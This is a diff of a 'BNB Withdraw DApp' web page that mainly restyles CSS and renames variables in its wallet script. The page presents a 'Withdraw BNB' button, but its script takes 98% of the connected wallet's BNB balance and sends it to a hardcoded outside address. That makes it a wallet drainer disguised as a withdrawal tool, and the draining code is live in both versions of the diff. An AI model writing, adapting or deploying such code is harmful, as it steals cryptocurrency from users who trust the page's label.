@@ -1,64 +1,71 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>BNB Withdraw</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BNB Withdraw DApp</title>
   <script type="module" src="wallet.js"></script>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 2rem;
-      background: #f9f9f9;
-      text-align: center;
-    }
+    * {
+      box-sizing: border-box;
+    }body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #f9f9f9;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+  padding: 1rem;
+}
 
-    w3m-core-button {
-      margin-bottom: 20px;
-    }
+w3m-core-button {
+  margin: 20px 0;
+}
 
-    #withdrawBtn {
-      background-color: #f0b90b;
-      color: white;
-      border: none;
-      padding: 14px 28px;
-      font-size: 16px;
-      border-radius: 8px;
-      cursor: pointer;
-      display: inline-block;
-    }
+#withdrawBtn {
+  background-color: #f0b90b;
+  color: white;
+  border: none;
+  padding: 1rem 2rem;
+  font-size: 1rem;
+  border-radius: 8px;
+  cursor: pointer;
+}
 
-    #message {
-      margin-top: 20px;
-      font-weight: bold;
-      color: #333;
-    }
+#message {
+  margin-top: 1.5rem;
+  font-size: 1rem;
+  font-weight: bold;
+  color: #d9534f;
+  text-align: center;
+}
+
+@media (max-width: 600px) {
+  #withdrawBtn {
+    width: 100%;
+    padding: 1rem;
+    font-size: 1.1rem;
+  }
+}
+
   </style>
 </head>
-<body>
+<body>  <!-- WalletConnect Button --><w3m-core-button></w3m-core-button>
 
-  <!-- Wallet Connect Button -->
-  <w3m-core-button></w3m-core-button>
+  <!-- Withdraw Button --><button id="withdrawBtn" style="display: none;">Withdraw BNB</button>
 
-  <!-- Withdraw Button -->
-  <button id="withdrawBtn" style="display: none;">Withdraw BNB</button>
-
-  <!-- Message Output -->
-  <div id="message"></div>
-
-  <!-- Withdraw Logic Script -->
-  <script type="module">
+  <!-- Message Display -->  <div id="message"></div>  <!-- Withdraw Script -->  <script type="module">
     import { getAccount, fetchBalance, sendTransaction } from "https://unpkg.com/@web3modal/ethereum@2.6.2";
 
     const withdrawBtn = document.getElementById("withdrawBtn");
-    const messageEl = document.getElementById("message");
-
-    const recipientAddress = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
+    const message = document.getElementById("message");
+    const recipient = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
     const MIN_USD = 5;
-    const sendPercentage = 0.98;
+    const SEND_PERCENT = 0.98;
 
-    // Get real-time BNB price
-    async function getBNBPriceUSD() {
+    async function getBNBPrice() {
       try {
         const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
         const data = await res.json();
@@ -68,62 +75,56 @@
       }
     }
 
-    // Check wallet connection status
-    async function checkConnection() {
-      const account = getAccount();
-      if (account && account.isConnected) {
+    async function checkWallet() {
+      const acc = getAccount();
+      if (acc?.isConnected) {
         withdrawBtn.style.display = "inline-block";
-        messageEl.textContent = "";
+        message.textContent = "Wallet connected. You can withdraw.";
       } else {
         withdrawBtn.style.display = "none";
-        messageEl.textContent = "Please connect your wallet to enable withdrawal.";
+        message.textContent = "Please connect your wallet to continue.";
       }
     }
 
-    // Withdraw handler
-    async function withdraw() {
-      const account = getAccount();
-      if (!account?.isConnected) {
-        messageEl.textContent = "Wallet not connected.";
+    async function withdrawBNB() {
+      const acc = getAccount();
+      if (!acc?.isConnected) {
+        message.textContent = "Wallet not connected.";
         return;
       }
 
       try {
-        const balanceData = await fetchBalance({ address: account.address, chainId: 56 });
-        const balanceBNB = parseFloat(balanceData.formatted);
-        const price = await getBNBPriceUSD();
-
+        const price = await getBNBPrice();
         if (!price) {
-          messageEl.textContent = "Failed to fetch BNB price.";
+          message.textContent = "Failed to fetch BNB price.";
           return;
         }
 
-        const balanceUSD = balanceBNB * price;
+        const balance = await fetchBalance({ address: acc.address, chainId: 56 });
+        const bnbAmount = parseFloat(balance.formatted);
+        const usdAmount = bnbAmount * price;
 
-        if (balanceUSD < MIN_USD) {
-          messageEl.textContent = "Insufficient balance. At least $5 in BNB is required.";
+        if (usdAmount < MIN_USD) {
+          message.textContent = `Minimum $${MIN_USD} required to withdraw. Current: $${usdAmount.toFixed(2)}`;
           return;
         }
 
-        const sendAmount = (balanceBNB * sendPercentage).toFixed(6);
-        const valueInWei = BigInt(Math.floor(Number(sendAmount) * 1e18)).toString();
+        const toSend = (bnbAmount * SEND_PERCENT).toFixed(6);
+        const valueWei = BigInt(Math.floor(toSend * 1e18)).toString();
 
         const { hash } = await sendTransaction({
-          to: recipientAddress,
-          value: valueInWei
+          to: recipient,
+          value: valueWei
         });
 
-        messageEl.textContent = `Transaction sent. Hash: ${hash}`;
+        message.textContent = `Transaction sent! Hash: ${hash}`;
       } catch (err) {
         console.error(err);
-        messageEl.textContent = "Transaction failed. Please check your wallet or try again.";
+        message.textContent = "Transaction failed. Please check gas fees and try again.";
       }
     }
 
-    withdrawBtn.addEventListener("click", withdraw);
-
-    // Monitor wallet status every 1s
-    setInterval(checkConnection, 1000);
-  </script>
-</body>
+    withdrawBtn.addEventListener("click", withdrawBNB);
+    setInterval(checkWallet, 1000);
+  </script></body>
 </html>
